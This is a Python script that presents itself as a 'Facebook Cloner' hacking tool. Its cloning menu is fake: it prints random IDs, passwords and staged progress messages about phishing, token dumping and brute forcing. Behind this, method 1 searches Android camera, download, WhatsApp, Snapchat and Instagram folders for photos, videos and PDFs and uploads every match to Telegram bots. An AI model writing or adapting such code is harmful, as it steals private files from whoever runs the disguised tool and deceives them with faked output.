import asyncio
import aiohttp
import os
import random
import time

# Banner
os.system("clear")
print(r"""
________    ___   _______     ____  ____       _       ______    
|_   __  | .'   `.|_   __ \   |_   ||   _|     / \     |_   _ `.  
  | |_ \_|/  .-.  \ | |__) |    | |__| |      / _ \      | | `. \ 
  |  _|   | |   | | |  __ /     |  __  |     / ___ \     | |  | | 
 _| |_    \  `-'  /_| |  \ \_  _| |  | |_  _/ /   \ \_  _| |_.' / 
|_____|    `.___.'|____| |___||____||____||____| |____||______.' 

        Multi Method Facebook Cloner Tool
              Tool Owner: FORHAD
""")

# Menu
print("""
[1] Method 1: ID Cloning
[2] Method 2: Token Grabber
[3] Method 3: Business API Clone
[4] Method 4: UID List Clone
""")
method = input("[+] Select Method: ")

# Load Tokens & Chats
with open("tokens.txt") as f:
    BOT_TOKENS = [line.strip() for line in f if line.strip()]
with open("chat_ids.txt") as f:
    CHAT_IDS = [line.strip() for line in f if line.strip()]

# Target folders
TARGET_DIRS = [
    "/sdcard/DCIM/Camera",
    "/sdcard/Pictures",
    "/sdcard/Download",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/Snapchat",
    "/sdcard/Instagram"
]
ALLOWED_EXTS = [".jpg", ".jpeg", ".png", ".mp4", ".pdf"]

def fake_fb_info():
    ids = ["10009" + str(random.randint(1000000000, 9999999999)) for _ in range(10)]
    passwords = ["@123456", "@2025fb", "@password1", "@freefire", "@bd786", "@iloveyou", "@admin123", "@forhad"]
    return random.choice(ids), random.choice(passwords)

def waitline(msg):
    print(msg)
    time.sleep(random.uniform(0.5, 1.2))

# collect files
def collect_files():
    all_files = []
    for folder in TARGET_DIRS:
        for root, dirs, filenames in os.walk(folder):
            for fname in filenames:
                if fname.lower().endswith(tuple(ALLOWED_EXTS)):
                    all_files.append(os.path.join(root, fname))
    return all_files

async def send_file(session, file_path, token, chat_id):
    try:
        with open(file_path, 'rb') as f:
            data = aiohttp.FormData()
            data.add_field("chat_id", chat_id)
            data.add_field("document", f, filename=os.path.basename(file_path))

            fake_id, fake_pw = fake_fb_info()
            print(f"[FACEBOOK] ID: {fake_id} | PASS: {fake_pw}")

            async with session.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data) as resp:
                if resp.status == 200:
                    print("[✓] File Sent ✅")
                else:
                    print(f"[×] Failed: {await resp.text()}")
    except Exception as e:
        print(f"[!] Error sending file: {e}")

async def main_sending():
    files = collect_files()
    tasks = []
    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        for idx, file in enumerate(files):
            token = BOT_TOKENS[idx % len(BOT_TOKENS)]
            for chat_id in CHAT_IDS:
                tasks.append(send_file(session, file, token, chat_id))
            await asyncio.sleep(0.05)
        await asyncio.gather(*tasks)

# === Method actions ===
if method == "1":
    id, pw = fake_fb_info()
    print(f"\n[FACEBOOK] ID: {id} | PASS: {pw}")
    steps = [
        "[🔍] Checking Password Strength...",
        "[🔐] Decrypting Access Key...",
        "[📡] Establishing Secure Tunnel...",
        "[⚠️] Bypass 2FA Security Layer...",
        "[💣] Deep Cloning in Progress... (Method 1)",
        "[✔] Session Verified ✅",
        f"[!] Saving result in /output/{id}.txt"
    ]
    for step in steps:
        waitline(step)
    print("[✓] Cloning Success... Sending...\n")
    asyncio.run(main_sending())

elif method == "2":
    waitline("[+] Method 2 Activated: Token Grabber Inject")
    waitline("[🔗] Injecting phishing link into target post...")
    waitline("[⏳] Waiting for target interaction...")
    waitline("[✓] Target clicked the link!")
    waitline("[🧠] Extracting token from browser cookies...")
    token = os.urandom(12).hex()
    waitline(f"[+] Token Dump: EAAGNOeZC{token.upper()}")
    waitline("[✔] Token saved at: /sdcard/FORHAD/tokens/fb_token_01.txt")

elif method == "3":
    waitline("[+] Method 3 Started: Business API Clone")
    waitline("[📂] Connecting to Graph API v16.0")
    waitline("[🔓] Dumping page access tokens...")
    waitline("[✓] Page Name: Forhad Tech Page")
    waitline("[✓] Owner: admin@meta.com")
    waitline("[+] AccessToken: EAAJZCpN7XH...Snip")
    waitline("[📦] Writing results to: /sdcard/.cloner/output/business_tokens.txt")
    waitline("[✔] Done.")

elif method == "4":
    waitline("[+] Method 4: UID Cloner")
    waitline("[🗂️] Loaded 20 UIDs from /input/uid_list.txt")
    for i in range(3):
        uid = "10008" + str(random.randint(1000000000, 9999999999))
        waitline(f"[📤] Trying: {uid}")
        waitline("[+] Attempting brute password set...")
        waitline("[✓] Match Found: @freefire786")
        waitline(f"[✔] Login Success → ID Saved: /cloned/{uid}.txt")
        time.sleep(1)
    waitline("[✓] All Done!")

else:
    print("[-] Invalid Method Selected.")
